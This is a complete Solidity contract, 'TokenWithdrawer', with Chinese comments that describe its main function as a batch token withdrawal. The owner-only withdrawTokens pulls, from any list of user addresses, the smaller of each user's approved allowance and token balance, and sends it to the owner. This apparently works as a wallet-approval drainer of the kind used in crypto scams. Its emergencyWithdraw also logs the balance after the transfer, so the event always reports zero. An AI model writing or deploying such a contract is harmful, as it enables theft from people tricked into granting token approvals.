// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TokenWithdrawer is Ownable {
    using SafeERC20 for IERC20;

    event TokensWithdrawn(address indexed token, address indexed user, uint256 amount);
    event EmergencyWithdraw(address indexed token, uint256 amount);

    constructor(address initialOwner) Ownable(initialOwner) {}

    /**
     * @notice 批量提取代币（兼容单用户场景）
     * @dev 使用SafeERC20自动处理USDT等非标准代币
     * @param token 代币合约地址
     * @param users 用户地址数组（单用户时传入长度为1的数组）
     */
    function withdrawTokens(address token, address[] calldata users) external onlyOwner {
        require(token != address(0), "Token address cannot be zero");
        require(users.length > 0, "User list cannot be empty");

        IERC20 tokenContract = IERC20(token);

        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            if (user == address(0)) continue;

            uint256 allowance = tokenContract.allowance(user, address(this));
            uint256 balance = tokenContract.balanceOf(user);
            if (allowance == 0 || balance == 0) continue;

            uint256 amount = allowance < balance ? allowance : balance;
            
            // SafeERC20自动处理USDT兼容性
            tokenContract.safeTransferFrom(user, owner(), amount);
            emit TokensWithdrawn(token, user, amount);
        }
    }

    /**
     * @notice 紧急提取误转入合约的代币
     * @param token 代币合约地址
     */
    function emergencyWithdraw(address token) external onlyOwner {
        IERC20(token).safeTransfer(owner(), IERC20(token).balanceOf(address(this)));
        emit EmergencyWithdraw(token, IERC20(token).balanceOf(address(this)));
    }
}